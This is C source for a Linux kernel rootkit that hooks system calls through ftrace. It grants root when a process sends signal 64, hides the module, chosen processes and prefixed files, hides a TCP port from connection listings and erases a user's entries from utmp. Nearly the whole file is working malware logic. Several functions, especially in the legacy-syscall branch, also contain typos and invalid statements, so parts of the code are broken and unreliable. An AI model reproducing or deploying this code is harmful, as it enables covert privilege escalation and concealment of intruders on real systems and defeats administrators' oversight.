#include "../headers/hooks.h"
#include "../headers/KernalKraken.h"
#include "../headers/credentials.h"
#include "../headers/stealth.h"
#include "../headers/utmp.h"

enum signals{
    SIGSUPER = 64, // become root
    SIGINVIS = 63, // hide the rootkit
    SIGHIDE = 62,  // hide process with pid given
};

unsigned long *__sys_call_table = NULL;
static short hidden = 0;
char hide_pid[NAME_MAX];
int tamper_fd;

#if PTREGS_SYSCALL_STUB

/**
 * if signal is 64 then gives the current user root privilegs
 * if signale is 63 hides the rootkit
 * kill
*/
//see http://www.kernel.org/doc/man-pages/online/pages/man2/kill.2.html
static asmlinkage long hook_kill(const struct pt_regs *regs){
    int sig = regs->si;
    pid_t pid = regs->di;

    void set_root(void);
    void hide_me(void);
    void show_me(void);

    if(sig == SIGSUPER){
        printk(KERN_INFO "signal: %d == SIGSUPER %d | giving root privilges\n", sig, SIGSUPER);
        set_root();
        return orig_kill;
    }else if((sig == SIGINVIS) && (hidden == 0)){
        printk(KERN_INFO "signal: %d == SIGINVIS %d | hiding the rootkit\n", sig, SIGINVIS);
        hide_me();
        hidden = 1;
        return orig_kill;
    }else if((sig == SIGINVIS) && (hidden == 1)){
        /* This is only for testing we don't want anyone to get rid of our rootkit */
        printk(KERN_INFO "signal: %d == SIGINVIS %d | reavling the rootkit\n", sig, SIGINVIS);
        show_me();
        hidden = 0;
        return orig_kill;
    }else if((sig == SIGHIDE)){
        printk(KERN_INFO "rootkit: hiding process with id %d\n",pid);
        sprintf(hide_pid, "%d", pid);
        return orig_kill;
    }

    printk(KERN_INFO "***** hacked kill syscall *****\n");

    return orig_kill(regs);
}

/**
 * sending any directory created to the dmesg logs
 * mkdir
*/
//see http://www.kernel.org/doc/man-pages/online/pages/man2/mkdir.2.html
static asmlinkage int hook_mkdir(const struct pt_regs *regs){
    char __user *pathname = (char *)regs->di;
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if(error > 0){
        printk(KERN_INFO "rootkit: trying to create directory with name : %s\n", dir_name);
    }
    printk(KERN_INFO "***** hacked mkdir syscall *****\n");

    orig_mkdir(regs);
    return 0;
}

/**
 * hiding directories and files with the PREFIX
 * getdents64
*/
//see http://www.kernel.org/doc/man-pages/online/pages/man2/getdents64.2.html
static asmlinkage long hook_getdents64(const struct pt_regs *regs){
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    long error;
    unsigned long index = 0;

    // get real output with all files in a directory
    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);
    if((ret <=0) || (dirent_ker == NULL)){
        return ret;
    }

    error = copy_from_user(dirent_ker, dirent, ret);
    if(error){
        goto done;
    }
    
    //loop through the directory to find the prefix
    while(index < ret){
        //looking at the first index.
        current_dir = (void *)dirent_ker + index;

        //checking if the file at the current directory has the prefix
        // or if the process id is equal to the one we want to hide
        if(memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0 || 
            ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) !=0))){
            // if the prefix is the first index of the list we have to move everything up
            if(current_dir == dirent_ker){
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }

            // we add the length of teh current directory to the previous one
            previous_dir->d_reclen += current_dir->d_reclen;
        }else{
            previous_dir = current_dir;
        }
        index += current_dir->d_reclen;
    }
    
    // return altered list to user
    error = copy_to_user(dirent, dirent_ker, ret);
    if(error){
        goto done;
    }

done:
    kfree(dirent_ker);
    return ret;

}

/**
 * hiding directories and files with the PREFIX
 * getdents
*/
//see http://www.kernel.org/doc/man-pages/online/pages/man2/getdents.2.html
static asmlinkage long hook_getdents(const struct pt_regs *regs){
    struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };


    struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    long error;
    unsigned long index = 0;

    // get real output with all files in a directory
    int ret = orig_getdents(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);
    if((ret <=0) || (dirent_ker == NULL)){
        return ret;
    }

    error = copy_from_user(dirent_ker, dirent, ret);
    if(error){
        goto done;
    }
    
    //loop through the directory to find the prefix
    while(index < ret){
        //looking at the first index.
        current_dir = (void *)dirent_ker + index;

        //checking if the file at the current directory has the prefix
        if(memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0 || 
            ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) !=0))){
            // if the prefix is the first index of the list we have to move everything up
            if(current_dir == dirent_ker){
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }

            // we add the length of teh current directory to the previous one
            previous_dir->d_reclen += current_dir->d_reclen;
        }else{
            previous_dir = current_dir;
        }
        index += current_dir->d_reclen;
    }
    
    // return altered list to user
    error = copy_to_user(dirent, dirent_ker, ret);
    if(error){
        goto done;
    }

    done:
        kfree(dirent_ker);
        return ret;
}

/*
 * hiding open ports that is equal to  PORT
 * tcp4_seq_show
*/
// not a syscall
static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v){
    struct sock *sk = v;
    int port;

    sprintf(port , "%x", PORT);

    /*
     * Check if sk_num is PORT
     * If sk doesn't point to anything, then it points to 0x1
     */
    if (sk != (struct sock *)0x1 && sk->sk_num == port){
        return 0;
    }
    /*
     * Otherwise, just return with the real tcp4_seq_show()
     */
    return orig_tcp4_seq_show(seq, v);
}

/* figure out the file descriptor for the utmp file then save it to change in the pread64 */
// see http://www.kernel.org/doc/man-pages/online/pages/man2/openat.2.html
static asmlinkage int hook_openat(const struct pt_regs *regs){
    //int dfd = regs->di;
    char *filename = (char *)regs->si;
    //int flags = regs->dx;
    //umode_t mode = regs->r10;

    char *kbuf;
    long error;
    char *target = "/var/run/utmp";
    int target_len = 14;

    /*
     * We need a buffer to copy filename into
     */
    kbuf = kzalloc(NAME_MAX, GFP_KERNEL);
    if(kbuf == NULL)
        return orig_openat(regs);

    /*
     * Copy filename from userspace into our kernel buffer
     */
    error = copy_from_user(kbuf, filename, NAME_MAX);
    if(error)
        return orig_openat(regs);

    /*
     * Compare filename to "/var/run/utmp"
     */
    if( memcmp(kbuf, target, target_len) == 0 ){
        /*
         * Save the file descriptor in tamper_fd, clean up and return
         */
        tamper_fd = orig_openat(regs);
        kfree(kbuf);
        return tamper_fd;
    }

    /*
     * Clean up and return
     */
    kfree(kbuf);
    return orig_openat(regs);
}

// see http://www.kernel.org/doc/man-pages/online/pages/man2/pread64.2.html
/*
 * The hook for sys_pread64()
 * First, we check if the file descriptor is the one stored in tamper_fd.
 * If it is, then we call the real sys_pread64(), copy the buffer into the kernel,
 * and check if the ut_user entry of the utmp struct is the user we want to hide.
 * Finally, if it matches, then we will the buffer with 0x0 before copying it back
 * to userspace and returning.
 */
static asmlinkage int hook_pread64(const struct pt_regs *regs){
    int fd = regs->di;
    char *buf = (char *)regs->si;
    size_t count = regs->dx;
    //loff_t pos = regs->r10;

    char *kbuf;
    struct utmp *utmp_buf;
    long error;
    int i, ret;

    /*
     * Check that we're supposed to be tampering with this fd
     * Better also be sure that tamper_fd isn't 0,1, or 2!
     */
    if ( (fd == tamper_fd) && (tamper_fd != 0) && (tamper_fd != 1) && (tamper_fd != 2) ){
        /*
         * Allocate a kernel buffer, and check it worked
         */
        kbuf = kzalloc(count, GFP_KERNEL);
        if (kbuf == NULL)
            return orig_pread64(regs);

        /*
         * Do the real syscall, so that buf gets filled for us
         */
        ret = orig_pread64(regs);

        /*
         * Copy buf into kbuf so we can look at it
         * If it fails, just return without doing anything
         */
        error = copy_from_user(kbuf, buf, count);
        if(error != 0)
            return ret;

        /*
         * Check if ut_user is the user we want to hide
         */
        utmp_buf = (struct utmp *)kbuf;
        if ( memcmp(utmp_buf->ut_user, USER, strlen(USER)) == 0 ){
            /*
             * Overwrite kbuf with 0x0
             */
            for ( i = 0 ; i < count ; i++ )
                kbuf[i] = 0x0;

            /* 
             * Copy kbuf back to buf in userspace
             * If it fails, there's nothing we can do, so just clean up and return
             */
            error = copy_to_user(buf, kbuf, count);
            
            kfree(kbuf);
            return ret;
        }

        /*
         * We intercepted a read to /var/run/utmp, but didn't find the user
         * we want to hide, so clean up and return
         */
        kfree(kbuf);
        return ret;
    }

    /*
     * This isn't a read to /var/run/utmp, so just return
     */
    return orig_pread64(regs);
}

#else
/**
 * if signal is 64 then gives the current user root privilegs
 * if signale is 63 hides the rootkit
 * kill
*/
//see http://www.kernel.org/doc/man-pages/online/pages/man2/kill.2.html
static asmlinkage long hook_kill(pid_t pid, int sig){
	void set_root(void);
    void hide_me(void);
    void show_me(void);
    
    if(sig == SIGSUPER){
        printk(KERN_INFO "signal: %d == SIGSUPER %d | giving root priveliges\n", sig, SIGSUPER);
        set_root();
        return 0;
    }else if((sig == SIGINVIS) && (hidden == 0)){
        printk(KERN_INFO "signal: %d == SIGINVIS %d | hiding the rootkit\n", sig, SIGINVIS);
        hide_me();
        hidden = 1;
        return 0;
    }else if((sig == SIGINVIS) && (hidden == 1)){
        /* This is only for testing we don't want anyone to get rid of our rootkit */
        printk(KERN_INFO "signal: %d == SIGINVIS %d | reavling the rootkit\n", sig, SIGINVIS);
        show_me();
        hidden = 0;
        return 0;
    }else if((sig == SIGHIDE)){
        printk(KERN_INFO "rootkit: hiding process with id %d\n",pid);
        sprintf(hide_pid, "%d", pid);
        return 0;
    }
    
    printk(KERN_INFO "***** hacked kill syscall *****\n");

    return orig_kill(regs);
}

/**
 * sending any directory created to the dmesg logs
 * mkdir
*/
//see http://www.kernel.org/doc/man-pages/online/pages/man2/mkdir.2.html
static asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode){

    char dir_name[NAME_MAX] = {0};

    long error =  strncpy_from_user(dir_name, pathname, NAME_MAX);

    if(error > 0){
        printk(KERN_INFO "rootkit: trying to create directory with name : %s\n", dir_name);
    }
    printk(KERN_INFO "***** hacked mkdir syscall *****\n");

    orig_mkdir(pathname, mode);
    return 0;
}

/**
 * hiding directories and files with the PREFIX
 * getdents64
*/
//see http://www.kernel.org/doc/man-pages/online/pages/man2/getdents64.2.html
static asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count){
    struct linux_dirent64 *current_dir, *previous_dir = NULL;
    unsigned long index = 0;
    long error;
    
    //getting actuall output of the dirr
    int ret = orig_getdents64(fd,dirent,count);
    dirent_ket = kzalloc(ret, GFP_KERNEL);
    if((ret <=0) || (dirent_ker == NULL)){
        return ret;
    }

    error = copy_from_user(dirent_ker, dirent, ret);
    if(error){
        goto done;
    }

    //looping thorugh the list to find the prefix and then remove those instances
    while(index < ret){
        current_dir = (void *) dirent_ker = 0;

        if(memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) ==0 || 
            ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) !=0))){
            if(current_dir == dirent_ker){
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen,ret);
                continue;
            }
        }else{
            previous_dir = current_dir;
        }
        index += current_dir->d_reclen;
    }

    error = copy_to_user(dirent,dirent_ker, ret);
    if(error){
        goto done;
    }

done:
    kfree(dirent_ker);
    return ret;
}

/**
 * hiding directories and files with the PREFIX
 * getdents
*/
//see http://www.kernel.org/doc/man-pages/online/pages/man2/getdents.2.html
static asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count){
    struct linux_dirent{
        unsigned long d_ino;
        unsigned long d_off;
        unsigned long d_reclen;
        char d_name[];
    }

    struct linux_dirent *current_dir, *previous_dir = NULL;
    unsigned long index = 0;
    long error;
    
    //getting actuall output of the dirr
    int ret = orig_getdents(fd,dirent,count);
    dirent_ket = kzalloc(ret, GFP_KERNEL);
    if((ret <=0) || (dirent_ker == NULL)){
        return ret;
    }

    error = copy_from_user(dirent_ker, dirent, ret);
    if(error){
        goto done;
    }

    //looping thorugh the list to find the prefix and then remove those instances
    while(index < ret){
        current_dir = (void *) dirent_ker = 0;

        if(memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) ==0 || 
            ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) !=0))){
            if(current_dir == dirent_ker){
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen,ret);
                continue;
            }
        }else{
            previous_dir = current_dir;
        }
        index += current_dir->d_reclen;
    }

    error = copy_to_user(dirent,dirent_ker, ret);
    if(error){
        goto done;
    }

done:
    kfree(dirent_ker);
    return ret;
}
#endif

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
    HOOK("__x64_sys_mkdir", hook_mkdir, &orig_mkdir),
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("__x64_sys_openat", hook_openat, &orig_openat),
    HOOK("__x64_sys_pread64", hook_pread64, &orig_pread64),
};